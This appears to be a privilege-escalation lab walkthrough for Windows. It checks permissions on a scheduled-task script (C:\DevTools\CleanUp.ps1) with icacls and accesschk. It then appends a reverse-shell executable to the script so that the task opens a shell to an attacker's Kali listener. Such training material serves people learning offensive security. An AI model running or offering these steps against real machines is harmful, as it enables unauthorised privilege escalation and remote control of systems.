
1. **View Scheduled Task Script:**
   ```plaintext
   type C:\DevTools\CleanUp.ps1
   ```

2. **Check Script Permissions Using icacls:**
   ```plaintext
   icacls "C:\DevTools\CleanUp.ps1"
   ```
   - The output should show that "BUILTIN\Users" or "NT AUTHORITY\INTERACTIVE" has "F" (Full Control) or "M" (Modify) permissions for the file to be vulnerable.

3. **Check Script Permissions Using AccessChk:**
   ```plaintext
   C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
   ```

4. **Exploit:**
   - Start a listener on Kali.
   - Append reverse shell command to the script:
     ```plaintext
     echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
     ```
   - Wait for the Scheduled Task to trigger the reverse shell.
